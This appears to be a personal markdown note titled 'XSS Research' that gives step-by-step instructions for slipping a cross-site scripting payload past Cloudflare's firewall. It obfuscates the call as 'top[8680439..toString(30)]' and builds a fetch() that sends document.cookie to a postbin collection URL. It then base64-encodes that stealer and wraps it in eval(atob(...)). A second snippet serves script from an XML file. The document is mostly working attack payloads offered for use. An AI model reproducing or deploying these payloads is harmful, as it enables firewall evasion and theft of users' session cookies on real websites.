# XSS Research
### Cloudflare bypass:
```
1. Insert the following XSS payload into the user input fields and observe that the Cloudflare doesn't block the request goint to the server.
	Paylaod: "><img src=x Onerror="top[8680439..toString(30)](document.cookie)">
	Modified payload: "><img src=x Onload="top[8680439..toString(30)](eval(alert(1)))"> - it worked for me
2. Now go to the postbin service, copy the postbin URL and craft the URL as follows to collect the cookies from the target website.
	Simple postbin URL: https://www.toptal.com/developers/postbin/1646819837437-0379188882652?hello=world
	Crafted Postbin URL: https://www.toptal.com/developers/postbin/1646819837437-0379188882652?cookie=
3. Now place the crafted postbin url in the following fetch method.
	fetch('<Postbin_url_here>'+document.cookie)
4. Now payload seems like --> fetch('https://www.toptal.com/developers/postbin/1646819837437-0379188882652?cookie='+document.cookie)
5. Now encode the output of the step 4 into the base64 encoded text.
6. Now place the base64 encoded payload into the following XSS payload.
	"><img src=x Onerror="top[8680439..toString(30)](eval(atob('<base64_encoded_payload_here>')))">
```
### Serve XSS payload from a XML file:
```
xss.xml:
<?xml version="1.0" encoding="UTF-8"?>
<html xmlns:html="http://w3.org/1999/xhtml">
<html:script>prompt(document.domain);</html:script>
</html>
```
